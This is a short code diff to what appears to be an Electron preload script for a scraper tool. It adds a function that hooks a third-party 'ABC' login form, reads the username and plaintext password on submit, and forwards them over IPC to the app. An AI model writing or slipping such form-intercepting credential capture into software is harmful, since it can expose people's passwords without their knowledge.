@@ -118,4 +118,26 @@ window.addEventListener('DOMContentLoaded', () => {
       console.log('[WCS Scraper] Member data:', JSON.stringify(memberData))
     }
   }, 3000)
+
+  // Credential capture for ABC login form
+  function captureAbcLogin() {
+    const form = document.querySelector('form')
+    if (!form || form._wcsCapture) return
+    const passwordField = form.querySelector('input[type="password"]')
+    if (!passwordField) return
+    form._wcsCapture = true
+
+    form.addEventListener('submit', () => {
+      const usernameField = form.querySelector('input[type="email"], input[type="text"], input[name*="user" i], input[name*="User"]')
+      const username = usernameField?.value?.trim()
+      const password = passwordField?.value
+      if (username && password) {
+        console.log('[WCS Scraper] Captured ABC login credentials')
+        ipcRenderer.send('credential-captured', { service: 'abc', username, password })
+      }
+    })
+  }
+
+  captureAbcLogin()
+  setInterval(captureAbcLogin, 2000)
 })
